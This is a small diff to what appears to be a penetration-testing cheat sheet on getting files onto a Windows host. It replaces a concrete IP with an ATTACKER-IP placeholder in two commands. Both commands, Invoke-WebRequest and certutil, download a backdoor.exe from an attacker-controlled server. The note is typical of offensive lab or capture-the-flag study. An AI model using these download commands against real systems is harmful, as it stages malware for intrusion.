@@ -1,8 +1,8 @@
 ==> Get stuff onto a Windows host
 
-Invoke-WebRequest http://10.14.10.117:1234/backdoor.exe -Outfile .\backdoor.exe
+Invoke-WebRequest http://ATTACKER-IP:1234/backdoor.exe -Outfile .\backdoor.exe
 
-certutil -urlcache -split -f http://10.14.10.117:1234/backdoor.exe
+certutil -urlcache -split -f http://ATTACKER-IP:1234/backdoor.exe
 
 via browser-download (server on attacker controlled machine)
 
